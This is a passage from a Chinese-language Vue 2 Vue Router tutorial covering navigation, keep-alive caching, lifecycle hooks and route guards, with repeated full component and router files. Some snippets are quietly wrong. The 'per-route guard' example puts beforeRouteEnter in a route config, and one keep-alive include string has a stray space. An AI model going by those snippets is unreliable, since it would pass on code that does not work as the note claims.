            children: [
                { path: 'yuehai', component: Yuehai, children: [
                        /**
                         * 三级路由，path 不要加 /
                         * detail/:id/:title：params 路径传参，:id：占位符
                         *
                         * props的第一种写法：props:{a:1,b:'hello'}，值为对象，该对象中的所有 key-value 都会以 props 的形式传给 Detail 组件
                         * props的第二种写法：props: true，值为布尔值，若布尔值为真，就会把该路由组件收到的所有 params 参数，以 props 的形式传给 Detail 组件
                         * props的第三种写法：值为函数；此为一个回调函数，vue 调用时会将 $route 传进来
                         */
                        {
                            path: 'detail',
                            // name: 'detail',
                            component: Detail,
                            props($route){
                                return { id: $route.query.id, title: $route.query.title }
                            }
                        }
                    ] },
                { path: 'yan', component: yan }
            ]
        },
        {
            path: '/about',
            component: About
        },
    ]
})
```

- 作为路由的组件不用在 App.vue 中引入

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div>
        <div class="row">
            <div class="col-xs-offset-2 col-xs-8">
                <div class="page-header"><h2>Vue Router Demo</h2></div>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-2 col-xs-offset-2">
                <div class="list-group">
                    <!-- 使用原始 html 中的 a 标签实现页面跳转 -->
                    <!--<a class="list-group-item" href="./about.html">About</a>-->
                    <!--<a class="list-group-item active" href="./home.html">Home</a>-->

                    <!-- Vue 中借助 router-link 标签实现路由的切换 -->
                    <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
                    <router-link class="list-group-item" active-class="active" to="/about">About</router-link>
                </div>
            </div>
            <div class="col-xs-6">
                <div class="panel">
                    <div class="panel-body">
                        <!-- 指定组件的呈现位置 -->
                        <router-view ></router-view>
                    </div>
                </div>
            </div>
        </div>
    </div>
</template>

<script>
    // 引入 bootstrap.css 样式
    import './assets/bootstrap/css/bootstrap.css'

    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App'
    }
</script>
```

- pages 目录下

```vue
<template>
    <!-- 网页结构 -->
    <h2>About 组件</h2>
</template>

<script>
    // js 代码
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'About'
    }
</script>
```

```vue
<template>
    <!-- 网页结构 -->

    <div class="row">
        <h2>Home 组件</h2>
        <div>
            <ul class="nav nav-tabs">
                <li>
                    <router-link class="list-group-item" active-class="active" to="/home/yuehai">月海</router-link>
                </li>
                <li>
                    <router-link class="list-group-item" active-class="active" to="/home/yan">言</router-link>
                </li>
            </ul>
            <router-view></router-view>
        </div>
    </div>
</template>

<script>
    // js 代码
    export default {
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Home'
    }
</script>
```

- pages/yuehai 目录下
   - yuehai.vue 中传递参数

```vue
<template>
    <div>
        <h3>月海</h3>
        <ul>
            <li v-for="msg in msgList" :key="msg.id">
                <!-- 跳转路由，并携带 query 参数，to 的字符串写法 -->
                <!--<router-link :to="`/home/yuehai/detail?id=${msg.id}&title=${msg.title}`">{{msg.title}}</router-link>-->

                <!-- 跳转路由，并携带 query 参数，to 的对象写法 -->
                <router-link :to="{
                    path: '/home/yuehai/detail',
                    query: { id: msg.id, title: msg.title }
                }">{{msg.title}}</router-link>
            </li>
        </ul>
        <hr/>
        <router-view></router-view>
    </div>
</template>

<script>
export default {
    // eslint-disable-next-line vue/multi-word-component-names
    name: "yuehai",
    data() {
        return {
            msgList: [
                { id: '001', title: '月海' },
                { id: '002', title: '言' },
            ]
        }
    }
}
</script>
```

```vue
<template>
    <h3>言</h3>
</template>

<script>
export default {
    // eslint-disable-next-line vue/multi-word-component-names
    name: "yan"
}
</script>
```

- pages/yuehai/detail/Detail.vue 中接收参数

```vue
<template>
    <div>
        <h4>消息列表</h4>
        <ul>
            <li>消息编号：{{id}}</li>
            <li>消息标题：{{title}}</li>
        </ul>
    </div>
</template>

<script>
export default {
    // eslint-disable-next-line vue/multi-word-component-names
    name: "Detail",
    props: [ 'id', 'title' ]
}
</script>

<style scoped>

</style>
```

## 8、`<router-link>`的replace属性

1. 作用：控制路由跳转时操作浏览器历史记录的模式
2. 浏览器的历史记录有两种写入方式：分别为`push`和`replace`，`push`是追加历史记录，`replace`是替换当前记录。路由跳转时候默认为`push`
   1. `push`：可前进后退
   2. `replace`：不可前进后退
3. 如何开启`replace`模式：`<router-link replace .......>News</router-link>`
4. 重复点击某个导航时，可能会报错：`NavigationDuplicated: Avoided redundant navigation to current location: "/home/yuehai/detail?id=001&title=%E6%9C%88%E6%B5%B7"`，此时可以在 `router /index` 的页面里面加入如下代码：

```javascript
const originalPush = VueRouter.prototype.push

VueRouter.prototype.push = function push(location) {
  return originalPush.call(this, location).catch(err => err)
}
```

## 9、编程式路由导航

1.  作用：不借助`<router-link>`实现路由跳转，让路由跳转更加灵活 
2.  具体编码： 

```javascript
//$router的两个API
this.$router.push({
	name:'xiangqing',
		params:{
			id:xxx,
			title:xxx
		}
})

this.$router.replace({
	name:'xiangqing',
		params:{
			id:xxx,
			title:xxx
		}
})
this.$router.forward() //前进
this.$router.back() //后退
this.$router.go() //可前进也可后退
```

---

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 引入 路由 router
import router from './router'

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App),
    // 使用路由
    router
}).$mount('#app')

```

- 在 src 目录下创建 router 文件夹，在其中创建 index.js 文件

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 路由 vue-router
import VueRouter from 'vue-router'
// 应用 路由 vue-router
Vue.use(VueRouter)

// 引入组件
import Home from '@/pages/Home.vue'
import About from '@/pages/About.vue'
import Yuehai from '@/pages/yuehai/yuehai.vue'
import yan from '@/pages/yuehai/yan.vue'
import Detail from '@/pages/yuehai/detail/Detail.vue'

// 创建一个路由器，并暴露
export default new VueRouter({
    // 配置路由
    routes: [
        // 一级路由
        {
            path: '/home',
            component: Home,
            // 二级路由，path 不要加 /
            children: [
                { path: 'yuehai', component: Yuehai, children: [
                        /**
                         * 三级路由，path 不要加 /
                         * detail/:id/:title：params 路径传参，:id：占位符
                         *
                         * props的第一种写法：props:{a:1,b:'hello'}，值为对象，该对象中的所有 key-value 都会以 props 的形式传给 Detail 组件
                         * props的第二种写法：props: true，值为布尔值，若布尔值为真，就会把该路由组件收到的所有 params 参数，以 props 的形式传给 Detail 组件
                         * props的第三种写法：值为函数；此为一个回调函数，vue 调用时会将 $route 传进来
                         */
                        {
                            path: 'detail',
                            // name: 'detail',
                            component: Detail,
                            props($route){
                                return { id: $route.query.id, title: $route.query.title }
                            }
                        }
                    ] },
                { path: 'yan', component: yan }
            ]
        },
        {
            path: '/about',
            component: About
        },
    ]
})
```

- 作为路由的组件不用在 App.vue 中引入

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div>
        <Banner />

        <div class="row">
            <div class="col-xs-offset-2 col-xs-8">
                <div class="page-header"><h2>Vue Router Demo</h2></div>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-2 col-xs-offset-2">
                <div class="list-group">
                    <!-- 使用原始 html 中的 a 标签实现页面跳转 -->
                    <!--<a class="list-group-item" href="./about.html">About</a>-->
                    <!--<a class="list-group-item active" href="./home.html">Home</a>-->

                    <!-- Vue 中借助 router-link 标签实现路由的切换 -->
                    <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
                    <router-link class="list-group-item" active-class="active" to="/about">About</router-link>
                </div>
            </div>
            <div class="col-xs-6">
                <div class="panel">
                    <div class="panel-body">
                        <!-- 指定组件的呈现位置 -->
                        <router-view ></router-view>
                    </div>
                </div>
            </div>
        </div>
    </div>
</template>

<script>
    // 引入 bootstrap.css 样式
    import './assets/bootstrap/css/bootstrap.css'

    // 引入组件
    import Banner from '@/components/Banner.vue'

    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        components: { Banner }
    }
</script>
```

- pages 目录下

```vue
<template>
    <!-- 网页结构 -->
    <h2>About 组件</h2>
</template>

<script>
    // js 代码
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'About'
    }
</script>
```
```vue
<template>
    <!-- 网页结构 -->

    <div class="row">
        <h2>Home 组件</h2>
        <div>
            <ul class="nav nav-tabs">
                <li>
                    <router-link class="list-group-item" active-class="active" to="/home/yuehai">月海</router-link>
                </li>
                <li>
                    <router-link class="list-group-item" active-class="active" to="/home/yan">言</router-link>
                </li>
            </ul>
            <router-view></router-view>
        </div>
    </div>
</template>

<script>
    // js 代码
    export default {
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Home'
    }
</script>
```

- pages/yuehai 目录下
   - yuehai.vue 中传递参数

```vue
<template>
    <div>
        <h3>月海</h3>
        <ul>
            <li v-for="msg in msgList" :key="msg.id">
                <!-- 跳转路由，并携带 query 参数，to 的对象写法 -->
                <span>{{msg.title}}</span>
                <button @click="pushShow(msg)">push 查看</button>
                <button @click="replaceShow(msg)">replace 查看</button>
            </li>
        </ul>
        <hr/>
        <router-view></router-view>
    </div>
</template>

<script>
export default {
    // eslint-disable-next-line vue/multi-word-component-names
    name: "yuehai",
    data() {
        return {
            msgList: [
                { id: '001', title: '月海' },
                { id: '002', title: '言' },
            ]
        }
    },
    methods: {
        pushShow(msg){
            // 调用路由跳转的函数，并传递参数
            this.$router.push({
                path: '/home/yuehai/detail',
                query: { id: msg.id, title: msg.title }
            })
        },
        replaceShow(msg){
            // 调用路由跳转的函数，并传递参数
            this.$router.replace({
                path: '/home/yuehai/detail',
                query: { id: msg.id, title: msg.title }
            })
        }
    }
}
</script>
```
```vue
<template>
    <h3>言</h3>
</template>

<script>
export default {
    // eslint-disable-next-line vue/multi-word-component-names
    name: "yan"
}
</script>
```

- pages/yuehai/detail/Detail.vue 中接收参数

```vue
<template>
    <div>
        <h4>消息列表</h4>
        <ul>
            <li>消息编号：{{id}}</li>
            <li>消息标题：{{title}}</li>
        </ul>
    </div>
</template>

<script>
export default {
    // eslint-disable-next-line vue/multi-word-component-names
    name: "Detail",
    props: [ 'id', 'title' ]
}
</script>

<style scoped>

</style>
```

- components/Banner.vue

```vue
<template>
    <div>
        <button @click="back">后退</button>
        <button @click="forward">前进</button>
        <button @click="testGo">测试 go</button>
    </div>
</template>

<script>
export default {
    // eslint-disable-next-line vue/multi-word-component-names
    name: "Banner",
    methods: {
        back(){
            this.$router.back();
        },
        forward(){
            this.$router.forward();
        },
        testGo(){
            /**
             * 传参：正数：前进 x 步
             *      负数：后退 x 步
             */
            this.$router.go(-2)
        }
    }
}
</script>
```

## 10、缓存路由组件

1.  作用：让不展示的路由组件保持挂载，不被销毁。（比如说不会让输入框中已经输入的内容消失）
2.  具体编码： 

```vue
<!-- 配置缓存路由组件，include 中配置的为组件名，配置上即为不销毁 -->
<keep-alive include="News"> 
    <router-view></router-view>
</keep-alive>
```

---

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 app 组件，他是所有组件的父组件
import App from './App.vue'

// 阻止 vue 在启动时生成开发版提示
Vue.config.productionTip = false

// 引入 路由 router
import router from './router'

// 创建 vue 实例对象
// $mount('#app') 等价于：el: '#app'，他的原型对象
new Vue({
    // 将 app 组件放入容器中；
    render: h => h(App),
    // 使用路由
    router
}).$mount('#app')

```

- 在 src 目录下创建 router 文件夹，在其中创建 index.js 文件

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 路由 vue-router
import VueRouter from 'vue-router'
// 应用 路由 vue-router
Vue.use(VueRouter)

// 引入组件
import Home from '@/pages/Home.vue'
import About from '@/pages/About.vue'
import Yuehai from '@/pages/yuehai/yuehai.vue'
import yan from '@/pages/yuehai/yan.vue'
import Detail from '@/pages/yuehai/detail/Detail.vue'

// 创建一个路由器，并暴露
export default new VueRouter({
    // 配置路由
    routes: [
        // 一级路由
        {
            path: '/home',
            component: Home,
            // 二级路由，path 不要加 /
            children: [
                { path: 'yuehai', component: Yuehai, children: [
                    /**
                     * 三级路由，path 不要加 /
                     * detail/:id/:title：params 路径传参，:id：占位符
                     *
                     * props的第一种写法：props:{a:1,b:'hello'}，值为对象，该对象中的所有 key-value 都会以 props 的形式传给 Detail 组件
                     * props的第二种写法：props: true，值为布尔值，若布尔值为真，就会把该路由组件收到的所有 params 参数，以 props 的形式传给 Detail 组件
                     * props的第三种写法：值为函数；此为一个回调函数，vue 调用时会将 $route 传进来
                     */
                    {
                        path: 'detail',
                        // name: 'detail',
                        component: Detail,
                        props($route){
                            return { id: $route.query.id, title: $route.query.title }
                        }
                    }
                ] },
                { path: 'yan', component: yan }
            ]
        },
        {
            path: '/about',
            component: About
        },
    ]
})
```

- 作为路由的组件不用在 App.vue 中引入

```vue
<template>
    <!-- 网页结构；组件里必须要有一个根元素，即此处的 div -->
    <div>
        <Banner />

        <div class="row">
            <div class="col-xs-offset-2 col-xs-8">
                <div class="page-header"><h2>Vue Router Demo</h2></div>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-2 col-xs-offset-2">
                <div class="list-group">
                    <!-- 使用原始 html 中的 a 标签实现页面跳转 -->
                    <!--<a class="list-group-item" href="./about.html">About</a>-->
                    <!--<a class="list-group-item active" href="./home.html">Home</a>-->

                    <!-- Vue 中借助 router-link 标签实现路由的切换 -->
                    <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
                    <router-link class="list-group-item" active-class="active" to="/about">About</router-link>
                </div>
            </div>
            <div class="col-xs-6">
                <div class="panel">
                    <div class="panel-body">
                        <!-- 指定组件的呈现位置 -->
                        <router-view ></router-view>
                    </div>
                </div>
            </div>
        </div>
    </div>
</template>

<script>
    // 引入 bootstrap.css 样式
    import './assets/bootstrap/css/bootstrap.css'

    // 引入组件
    import Banner from '@/components/Banner.vue'

    // js 代码
    // 创建组件的简写形式，省略 Vue.extend(options)
    export default {
        // 给组件起一个名称（可以省略）
        name: 'App',
        components: { Banner }
    }
</script>
```

- pages/Home.vue，中使用 `<keep-alive></keep-alive>` 标签

```vue
<template>
    <!-- 网页结构 -->

    <div class="row">
        <h2>Home 组件</h2>
        <div>
            <ul class="nav nav-tabs">
                <li>
                    <router-link class="list-group-item" active-class="active" to="/home/yuehai">月海</router-link>
                </li>
                <li>
                    <router-link class="list-group-item" active-class="active" to="/home/yan">言</router-link>
                </li>
            </ul>

            <!-- 配置缓存路由组件，include 中配置的为组件名，配置上即为不销毁 -->
            <keep-alive include="yan, yuehai">
                <router-view></router-view>
            </keep-alive>

        </div>
    </div>
</template>

<script>
    // js 代码
    export default {
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'Home'
    }
</script>
```

```vue
<template>
    <!-- 网页结构 -->
    <h2>About 组件</h2>
</template>

<script>
    // js 代码
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'About'
    }
</script>
```

- pages/yuehai 目录下
   - yan.vue 中传递参数，编写 `input` 标签

```vue
<template>
    <div>
        <h3>言</h3>
        <ul>
            <li v-for="msg in msgList" :key="msg.id">
                <p>
                    {{msg.title}}
                    <input type="text" />
                </p>
            </li>
        </ul>
    </div>
</template>

<script>
export default {
    // eslint-disable-next-line vue/multi-word-component-names
    name: "yan",
    data() {
        return {
            msgList: [
                { id: '001', title: '月海' },
                { id: '002', title: '言' },
            ]
        }
    },
}
</script>
```

```vue
<template>
    <div>
        <h3>月海</h3>
        <ul>
            <li v-for="msg in msgList" :key="msg.id">
                <!-- 跳转路由，并携带 query 参数，to 的对象写法 -->
                <span>{{msg.title}}</span>
                <button @click="pushShow(msg)">push 查看</button>
                <button @click="replaceShow(msg)">replace 查看</button>
            </li>
        </ul>
        <hr/>
        <router-view></router-view>
    </div>
</template>

<script>
export default {
    // eslint-disable-next-line vue/multi-word-component-names
    name: "yuehai",
    data() {
        return {
            msgList: [
                { id: '001', title: '月海' },
                { id: '002', title: '言' },
            ]
        }
    },
    methods: {
        pushShow(msg){
            // 调用路由跳转的函数，并传递参数
            this.$router.push({
                path: '/home/yuehai/detail',
                query: { id: msg.id, title: msg.title }
            })
        },
        replaceShow(msg){
            // 调用路由跳转的函数，并传递参数
            this.$router.replace({
                path: '/home/yuehai/detail',
                query: { id: msg.id, title: msg.title }
            })
        }
    }
}
</script>
```

- pages/yuehai/detail/Detail.vue 中接收参数

```vue
<template>
    <div>
        <h4>消息列表</h4>
        <ul>
            <li>消息编号：{{id}}</li>
            <li>消息标题：{{title}}</li>
        </ul>
    </div>
</template>

<script>
export default {
    // eslint-disable-next-line vue/multi-word-component-names
    name: "Detail",
    props: [ 'id', 'title' ]
}
</script>

<style scoped>

</style>
```

- components/Banner.vue

```vue
<template>
    <div>
        <button @click="back">后退</button>
        <button @click="forward">前进</button>
        <button @click="testGo">测试 go</button>
    </div>
</template>

<script>
export default {
    // eslint-disable-next-line vue/multi-word-component-names
    name: "Banner",
    methods: {
        back(){
            this.$router.back();
        },
        forward(){
            this.$router.forward();
        },
        testGo(){
            /**
             * 传参：正数：前进 x 步
             *      负数：后退 x 步
             */
            this.$router.go(-2)
        }
    }
}
</script>
```

## 11、两个新的生命周期钩子

1. 作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。
2. 具体名字： 
   1. `activated`路由组件被激活时触发。
   2. `deactivated`路由组件失活时触发。

```vue
<template>
    <div>
        <h3>言</h3>
        <ul>
            <li :style="{opacity}">欢迎学习Vue</li>
            <li v-for="msg in msgList" :key="msg.id">
                <p>
                    {{msg.title}}
                    <input type="text" />
                </p>
            </li>
        </ul>
    </div>
</template>

<script>
export default {
    // eslint-disable-next-line vue/multi-word-component-names
    name: "yan",
    data() {
        return {
            opacity: 1,
            msgList: [
                { id: '001', title: '月海' },
                { id: '002', title: '言' },
            ]
        }
    },
    // 路由组件被激活时激活
    activated() {
        console.log("组件激活了")
        // 创建一个定时器，使其离开时对其进行关闭
        this.timer = setInterval(()=>{
            console.log('@')
            this.opacity -= 0.01
            if(this.opacity <= 0) this.opacity = 1
        },16)
    },
    // 路由组件被激活时失活
    deactivated() {
        console.log("组件失活了")
        clearInterval(this.timer)
    }
}
</script>
```

## 12、路由守卫

### ①、说明

1.  作用：对路由进行权限控制 
2.  分类：全局守卫、独享守卫、组件内守卫 
3.  全局守卫：

```javascript
//全局前置守卫：初始化时执行、每次路由切换前执行
router.beforeEach((to,from,next)=>{
	console.log('beforeEach',to,from)
	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
		if(localStorage.getItem('school') === 'atguigu'){ //权限控制的具体规则
			next() //放行
		}else{
			alert('暂无权限查看')
			// next({name:'guanyu'})
		}
	}else{
		next() //放行
	}
})

//全局后置守卫：初始化时执行、每次路由切换后执行
router.afterEach((to,from)=>{
	console.log('afterEach',to,from)
	if(to.meta.title){ 
		document.title = to.meta.title //修改网页的title
	}else{
		document.title = 'vue_test'
	}
})
```

4.  独享守卫：

```javascript
beforeEnter(to,from,next){
	console.log('beforeEnter',to,from)
	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
		if(localStorage.getItem('school') === 'atguigu'){
			next()
		}else{
			alert('暂无权限查看')
			// next({name:'guanyu'})
		}
	}else{
		next()
	}
}
```

5.  组件内守卫： 

```javascript
//进入守卫：通过路由规则，进入该组件时被调用
beforeRouteEnter (to, from, next) {
},
//离开守卫：通过路由规则，离开该组件时被调用
beforeRouteLeave (to, from, next) {
}
```

6. 在本地存储中加入`{name: 'yuehai'}`，只有 name 为 yuehai 才能访问

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--51-00-876--fYm7mMlJDCZPEQ.png)

### ②、全局守卫

- 参数 `to, from`
- 路由配置中可添加 `meta` 对象，其中可放入自定义配置属性

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--51-01-006--5_KfqdwRn_bO2g.png)

#### Ⅰ、前置全局守卫：自己根据路径判断

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 路由 vue-router
import VueRouter from 'vue-router'
// 应用 路由 vue-router
Vue.use(VueRouter)

// 引入组件
import Home from '@/pages/Home.vue'
import About from '@/pages/About.vue'
import Yuehai from '@/pages/yuehai/yuehai.vue'
import yan from '@/pages/yuehai/yan.vue'
import Detail from '@/pages/yuehai/detail/Detail.vue'

// 创建一个路由器
const router = new VueRouter({
    // 配置路由
    routes: [
        // 一级路由
        {
            name: 'home',
            path: '/home',
            component: Home,
            // 二级路由，path 不要加 /
            children: [
                { name: 'yuehai', path: 'yuehai', component: Yuehai, children: [
                    /**
                     * 三级路由，path 不要加 /
                     * detail/:id/:title：params 路径传参，:id：占位符
                     *
                     * props的第一种写法：props:{a:1,b:'hello'}，值为对象，该对象中的所有 key-value 都会以 props 的形式传给 Detail 组件
                     * props的第二种写法：props: true，值为布尔值，若布尔值为真，就会把该路由组件收到的所有 params 参数，以 props 的形式传给 Detail 组件
                     * props的第三种写法：值为函数；此为一个回调函数，vue 调用时会将 $route 传进来
                     */
                    {
                        name: 'detail',
                        path: 'detail',
                        // name: 'detail',
                        component: Detail,
                        props($route){
                            return { id: $route.query.id, title: $route.query.title }
                        }
                    }
                ] },
                { name: 'yan', path: 'yan', component: yan }
            ]
        },
        {
            name: 'about',
            path: '/about',
            component: About
        },
    ]
})

/**
 * 全局前置路由守卫；在每一次路由切换之前都会执行此函数
 * to：到哪里去
 * from：从哪里来
 * next：放行
 */
router.beforeEach((to, from, next)=>{
    console.log(to, from)
    // 判断要进入的路径是不是 /home/yuehai 或者 /home/yan
    if (to.path === '/home/yuehai' || to.path === '/home/yan'){
        // 判断本地存储中的 name 是否为 yuehai
        if (localStorage.getItem("name") === "yuehai"){
            // 是的话放行
            next()
        }else{
            alert("用户错误")
        }
    }else{
        next()
    }
})

// 暴露
export default router
```

#### Ⅱ、前置全局守卫：配置是否拦截

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 路由 vue-router
import VueRouter from 'vue-router'
// 应用 路由 vue-router
Vue.use(VueRouter)

// 引入组件
import Home from '@/pages/Home.vue'
import About from '@/pages/About.vue'
import Yuehai from '@/pages/yuehai/yuehai.vue'
import yan from '@/pages/yuehai/yan.vue'
import Detail from '@/pages/yuehai/detail/Detail.vue'

// 创建一个路由器
const router = new VueRouter({
    // 配置路由
    routes: [
        // 一级路由
        {
            name: 'home',
            path: '/home',
            component: Home,
            meta: { isAuth: false },
            // 二级路由，path 不要加 /
            children: [
                { name: 'yuehai', path: 'yuehai', component: Yuehai, meta: { isAuth: true }, children: [
                    /**
                     * 三级路由，path 不要加 /
                     * detail/:id/:title：params 路径传参，:id：占位符
                     *
                     * props的第一种写法：props:{a:1,b:'hello'}，值为对象，该对象中的所有 key-value 都会以 props 的形式传给 Detail 组件
                     * props的第二种写法：props: true，值为布尔值，若布尔值为真，就会把该路由组件收到的所有 params 参数，以 props 的形式传给 Detail 组件
                     * props的第三种写法：值为函数；此为一个回调函数，vue 调用时会将 $route 传进来
                     */
                    {
                        name: 'detail',
                        path: 'detail',
                        // name: 'detail',
                        component: Detail,
                        props($route){
                            return { id: $route.query.id, title: $route.query.title }
                        }
                    }
                ] },
                { name: 'yan', path: 'yan', component: yan, meta: { isAuth: true } }
            ]
        },
        {
            name: 'about',
            path: '/about',
            component: About,
            meta: { isAuth: false },
        },
    ]
})

/**
 * 全局前置路由守卫；在每一次路由切换之前都会执行此函数
 * to：到哪里去
 * from：从哪里来
 * next：放行
 */
router.beforeEach((to, from, next)=>{
    // 根据配置的 meta 判断是否要拦截
    if (to.meta.isAuth){
        // 判断本地存储中的 name 是否为 yuehai
        if (localStorage.getItem("name") === "yuehai"){
            // 是的话放行
            next()
        }else{
            alert("用户错误")
        }
    }else{
        next()
    }
})

// 暴露
export default router
```

#### Ⅲ、全局后置路由守卫

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 路由 vue-router
import VueRouter from 'vue-router'
// 应用 路由 vue-router
Vue.use(VueRouter)

// 引入组件
import Home from '@/pages/Home.vue'
import About from '@/pages/About.vue'
import Yuehai from '@/pages/yuehai/yuehai.vue'
import yan from '@/pages/yuehai/yan.vue'
import Detail from '@/pages/yuehai/detail/Detail.vue'

// 创建一个路由器
const router = new VueRouter({
    // 配置路由
    routes: [
        // 一级路由
        {
            name: 'home',
            path: '/home',
            component: Home,
            meta: { isAuth: false, title: '主页' },
            // 二级路由，path 不要加 /
            children: [
                { name: 'yuehai', path: 'yuehai', component: Yuehai, meta: { isAuth: true, title: '月海' }, children: [
                    /**
                     * 三级路由，path 不要加 /
                     * detail/:id/:title：params 路径传参，:id：占位符
                     *
                     * props的第一种写法：props:{a:1,b:'hello'}，值为对象，该对象中的所有 key-value 都会以 props 的形式传给 Detail 组件
                     * props的第二种写法：props: true，值为布尔值，若布尔值为真，就会把该路由组件收到的所有 params 参数，以 props 的形式传给 Detail 组件
                     * props的第三种写法：值为函数；此为一个回调函数，vue 调用时会将 $route 传进来
                     */
                    {
                        name: 'detail',
                        path: 'detail',
                        // name: 'detail',
                        component: Detail,
                        meta: { isAuth: true, title: '详情' },
                        props($route){
                            return { id: $route.query.id, title: $route.query.title }
                        }
                    }
                ] },
                { name: 'yan', path: 'yan', component: yan, meta: { isAuth: true, title: '言' } }
            ]
        },
        {
            name: 'about',
            path: '/about',
            component: About,
            meta: { isAuth: false, title: '关于' },
        },
    ]
})

/**
 * 全局前置路由守卫；在每一次路由切换之前都会执行此函数
 * to：到哪里去
 * from：从哪里来
 * next：放行
 */
router.beforeEach((to, from, next)=>{
    // 根据配置的 meta 判断是否要拦截
    if (to.meta.isAuth){
        // 判断本地存储中的 name 是否为 yuehai
        if (localStorage.getItem("name") === "yuehai"){
            // 是的话放行
            next()
        }else{
            alert("用户错误")
        }
    }else{
        next()
    }
})

/**
 * 全局后置路由守卫；在每一次路由切换之后都会执行此函数
 * to：到哪里去
 * from：从哪里来
 */
router.afterEach((to, from)=>{
    // 设置浏览器标签显示的名称
    document.title = to.meta.title || "月海"
})

// 暴露
export default router
```

### ③、独享守卫

- 对单个路由进行守卫，配置在路由配置中
- 可配合全局路由守卫一起使用

```javascript
// 引入 vue
import Vue from 'vue'
// 引入 路由 vue-router
import VueRouter from 'vue-router'
// 应用 路由 vue-router
Vue.use(VueRouter)

// 引入组件
import Home from '@/pages/Home.vue'
import About from '@/pages/About.vue'
import Yuehai from '@/pages/yuehai/yuehai.vue'
import yan from '@/pages/yuehai/yan.vue'
import Detail from '@/pages/yuehai/detail/Detail.vue'

// 创建一个路由器
const router = new VueRouter({
    // 配置路由
    routes: [
        // 一级路由
        {
            name: 'home',
            path: '/home',
            component: Home,
            meta: { isAuth: false, title: '主页' },
            // 二级路由，path 不要加 /
            children: [
                { name: 'yuehai', path: 'yuehai', component: Yuehai, meta: { isAuth: true, title: '月海' }, children: [
                    /**
                     * 三级路由，path 不要加 /
                     * detail/:id/:title：params 路径传参，:id：占位符
                     *
                     * props的第一种写法：props:{a:1,b:'hello'}，值为对象，该对象中的所有 key-value 都会以 props 的形式传给 Detail 组件
                     * props的第二种写法：props: true，值为布尔值，若布尔值为真，就会把该路由组件收到的所有 params 参数，以 props 的形式传给 Detail 组件
                     * props的第三种写法：值为函数；此为一个回调函数，vue 调用时会将 $route 传进来
                     */
                    {
                        name: 'detail',
                        path: 'detail',
                        // name: 'detail',
                        component: Detail,
                        meta: { isAuth: true, title: '详情' },
                        props($route){
                            return { id: $route.query.id, title: $route.query.title }
                        },
                        // 独享路由守卫
                        beforeRouteEnter: (to, from, next)=>{
                            // 根据配置的 meta 判断是否要拦截
                            if (to.meta.isAuth){
                                // 判断本地存储中的 name 是否为 yuehai
                                if (localStorage.getItem("name") === "yuehai"){
                                    // 是的话放行
                                    next()
                                }else{
                                    alert("用户错误")
                                }
                            }else{
                                next()
                            }
                        }
                    }
                ] },
                { name: 'yan', path: 'yan', component: yan, meta: { isAuth: true, title: '言' } }
            ]
        },
        {
            name: 'about',
            path: '/about',
            component: About,
            meta: { isAuth: false, title: '关于' },
        },
    ]
})

/**
 * 全局后置路由守卫；在每一次路由切换之后都会执行此函数
 * to：到哪里去
 * from：从哪里来
 */
router.afterEach((to, from)=>{
    // 设置浏览器标签显示的名称
    document.title = to.meta.title || "月海"
})

// 暴露
export default router
```

### ④、组件内守卫

- 在组件内对组件进行独有的配置
- 可配合全局路由守卫一起使用

```vue
<template>
    <!-- 网页结构 -->
    <h2>About 组件</h2>
</template>

<script>
    // js 代码
    export default{
        // 给组件起一个名称（可以省略）
        // eslint-disable-next-line vue/multi-word-component-names
        name: 'About',
        // 通过路由规则，进入该组件时被调用
        beforeRouteEnter(to, from, next){
            // 根据配置的 meta 判断是否要拦截
            if (to.meta.isAuth){
                // 判断本地存储中的 name 是否为 yuehai
                if (localStorage.getItem("name") === "yuehai"){
                    // 是的话放行
                    next()
                }else{
                    alert("用户错误")
                }
            }else{
                next()
            }
        },
        // 通过路由规则，离开该组件时被调用
        beforeRouteLeave(to, from, next){
            next()
        }
    }
</script>
```

